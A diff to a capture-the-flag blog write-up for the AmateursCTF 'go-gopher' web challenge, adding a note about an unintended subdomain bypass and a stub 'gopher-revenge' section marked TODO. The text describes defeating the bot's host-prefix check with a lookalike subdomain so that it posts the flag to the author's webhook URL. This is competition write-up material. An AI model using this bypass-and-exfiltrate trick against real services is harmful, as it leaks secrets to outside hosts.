@@ -97,6 +97,8 @@
 
 <h2 id="go-gopher">go-gopher</h2>
 
+<p>This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge <a href="#gopher-revenge">gopher-revenge</a>.</p>
+
 <ul>
   <li>Description:
     <blockquote>
@@ -151,7 +153,7 @@
 
 <p>The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.</p>
 
-<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomain like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
+<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomains like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
 
 <p><img src="/assets/image/amateursctf-web-writeup/go-gopher-flag.png" alt="go-gopher flag" /></p>
 
@@ -182,6 +184,24 @@ iagain          error.host      1
         https://webhook.site/[reducted]       ::      31337
 .
 </code></pre></div></div>
+
+<h2 id="gopher-revenge">gopher-revenge</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>you guys are going to regret ever crossing me.</p>
+    </blockquote>
+
+    <p>Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:</p>
+    <blockquote>
+      <p>the flag in “flag.txt” is the exact same flag you need to submit</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+</ul>
+
+<p>TODO: writeup</p>
 
   </div><a class="u-url" href="/posts/amateursctf-web-writeup/" hidden></a>
 </article>
